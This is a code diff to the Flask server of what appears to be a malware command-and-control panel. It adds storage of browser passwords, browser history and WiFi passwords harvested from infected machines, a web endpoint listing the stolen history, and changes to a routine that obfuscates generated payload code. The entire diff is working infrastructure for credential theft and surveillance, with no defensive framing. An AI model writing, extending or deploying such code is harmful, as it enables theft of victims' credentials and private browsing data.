@@ -144,8 +144,34 @@ def _obfuscate_code(code):
             i += 1
             continue
 
-        # Remove all print() calls entirely
+        # Skip print() calls entirely but ensure blocks have content
         if 'print(' in line.strip():
+            # Check if this print is in a block that might become empty
+            current_indent = len(line) - len(line.lstrip())
+            # Look ahead to see if there are more statements at this level
+            has_more_content = False
+            look_ahead = i + 1
+            while look_ahead < len(lines):
+                next_line = lines[look_ahead]
+                if next_line.strip() == '' or next_line.strip().startswith('#'):
+                    look_ahead += 1
+                    continue
+                next_indent = len(next_line) - len(next_line.lstrip())
+                if next_indent > current_indent:
+                    # There's indented content, so this block won't be empty
+                    break
+                elif next_indent == current_indent and not next_line.strip().startswith('#'):
+                    # There's more content at same level
+                    has_more_content = True
+                    break
+                else:
+                    # Less indented or end of block
+                    break
+
+            if not has_more_content:
+                # This might leave a block empty, so replace with pass instead
+                obfuscated_lines.append(' ' * current_indent + 'pass')
+            # Skip the original print line
             i += 1
             continue
 
@@ -213,7 +239,9 @@ def _obfuscate_code(code):
         while i < len(lines):
             line = lines[i]
             processed_lines.append(line)
-            if line.strip().endswith(':'):
+            stripped = line.strip()
+            # Only add pass to control flow blocks, not dict literals
+            if stripped.endswith(':') and any(kw in stripped for kw in ['if ', 'for ', 'while ', 'try', 'except', 'def ', 'class ', 'with ']):
                 block_indent = len(line) - len(line.lstrip())
                 # Check if there's any indented content in the block
                 has_content = False
@@ -726,6 +754,7 @@ def init_api_routes(app, socketio):
             c.execute("DELETE FROM screenshots WHERE agent_id=?", (agent_id,))
             c.execute("DELETE FROM credentials WHERE agent_id=?", (agent_id,))
             c.execute("DELETE FROM stolen_data WHERE agent_id=?", (agent_id,))
+            c.execute("DELETE FROM browser_history WHERE agent_id=?", (agent_id,))
             
             # Now delete the agent
             c.execute("DELETE FROM agents WHERE id=?", (agent_id,))
@@ -935,20 +964,87 @@ def init_api_routes(app, socketio):
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
             # Handle credential harvesting
-            if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
-                for cred in data['result']['credentials']:
-                    try:
-                        c.execute('''INSERT INTO credentials 
-                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                                (None, data['agent_id'],
-                                cred.get('browser', ''),
-                                cred.get('url', ''),
-                                cred.get('username', ''),
-                                cred.get('password', ''),
-                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
-                    except Exception as e:
-                        app.logger.error(f"Error storing credential: {str(e)}")
-                        pass
+            if data['task_type'] == 'harvest_creds' and 'result' in data and 'credentials' in data['result']:
+                app.logger.info(f"Processing credential harvesting results for agent {data['agent_id']}")
+                # Store browser credentials
+                if 'credentials' in data['result']:
+                    app.logger.info(f"Storing {len(data['result']['credentials'])} credentials")
+                    for cred in data['result']['credentials']:
+                        try:
+                            # Check if this credential already exists
+                            c.execute('''SELECT id FROM credentials
+                                        WHERE agent_id=? AND browser=? AND url=? AND username=? AND password=?''',
+                                     (data['agent_id'], cred.get('browser', 'unknown'),
+                                      cred.get('url', ''), cred.get('username', ''),
+                                      cred.get('password', '')))
+                            existing = c.fetchone()
+
+                            if existing:
+                                app.logger.info(f"Credential already exists, skipping: {cred.get('browser')} - {cred.get('url')}")
+                                continue
+
+                            c.execute('''INSERT INTO credentials
+                                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                                     (None, data['agent_id'], cred.get('browser', 'unknown'),
+                                      cred.get('url', ''), cred.get('username', ''),
+                                      cred.get('password', ''), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                            conn.commit()
+                            app.logger.info(f"Stored credential: {cred.get('browser')} - {cred.get('url')}")
+                        except Exception as e:
+                            app.logger.error(f"Error storing browser credential: {str(e)}")
+
+                # Store browser history
+                if 'history' in data['result']:
+                    app.logger.info(f"Storing {len(data['result']['history'])} history entries")
+                    for hist in data['result']['history']:
+                        try:
+                            # Check if this history entry already exists
+                            c.execute('''SELECT id FROM browser_history
+                                        WHERE agent_id=? AND browser=? AND profile=? AND url=? AND title=?''',
+                                     (data['agent_id'], hist.get('browser', 'unknown'),
+                                      hist.get('profile', ''), hist.get('url', ''),
+                                      hist.get('title', '')))
+                            existing = c.fetchone()
+
+                            if existing:
+                                app.logger.info(f"History entry already exists, skipping: {hist.get('browser')} - {hist.get('url')}")
+                                continue
+
+                            c.execute('''INSERT INTO browser_history
+                                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                                     (None, data['agent_id'], hist.get('browser', 'unknown'),
+                                      hist.get('profile', ''), hist.get('url', ''),
+                                      hist.get('title', ''), hist.get('visit_count', 0),
+                                      hist.get('last_visit_time', 0), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                            conn.commit()
+                            app.logger.info(f"Stored history: {hist.get('browser')} - {hist.get('url')}")
+                        except Exception as e:
+                            app.logger.error(f"Error storing browser history: {str(e)}")
+
+                # Store WiFi passwords (if any new ones)
+                if 'wifi' in data['result']:
+                    app.logger.info(f"Storing {len(data['result']['wifi'])} WiFi passwords")
+                    for wifi in data['result']['wifi']:
+                        try:
+                            # Check if this WiFi credential already exists
+                            c.execute('''SELECT id FROM credentials
+                                        WHERE agent_id=? AND browser='wifi' AND username=? AND password=?''',
+                                     (data['agent_id'], wifi.get('ssid', ''),
+                                      wifi.get('password', '')))
+                            existing = c.fetchone()
+
+                            if existing:
+                                app.logger.info(f"WiFi credential already exists, skipping: {wifi.get('ssid')}")
+                                continue
+
+                            c.execute('''INSERT INTO credentials
+                                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                                     (None, data['agent_id'], 'wifi', '', wifi.get('ssid', ''),
+                                      wifi.get('password', ''), datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                            conn.commit()
+                            app.logger.info(f"Stored WiFi: {wifi.get('ssid')}")
+                        except Exception as e:
+                            app.logger.error(f"Error storing WiFi password: {str(e)}")
             
             conn.commit()
             
@@ -1683,3 +1779,45 @@ def init_api_routes(app, socketio):
 
         delete_file_later(shellcode_path)
         return response
+
+    @app.route('/api/browser_history', methods=['GET'])
+    @login_required
+    def get_browser_history():
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+
+            c.execute('''
+                SELECT id, agent_id, browser, profile, url, title, visit_count, last_visit_time, timestamp
+                FROM browser_history
+                ORDER BY timestamp DESC
+                LIMIT 1000
+            ''')
+
+            history = []
+            for row in c.fetchall():
+                history.append({
+                    'id': row[0],
+                    'agent_id': row[1],
+                    'browser': row[2],
+                    'profile': row[3] or '',
+                    'url': row[4],
+                    'title': row[5] or '',
+                    'visit_count': row[6] or 0,
+                    'last_visit_time': row[7] or 0,
+                    'timestamp': row[8]
+                })
+
+            conn.close()
+
+            return jsonify({
+                'status': 'success',
+                'history': history
+            })
+
+        except Exception as e:
+            app.logger.error(f"Error fetching browser history: {str(e)}")
+            return jsonify({
+                'status': 'error',
+                'message': str(e)
+            }), 500
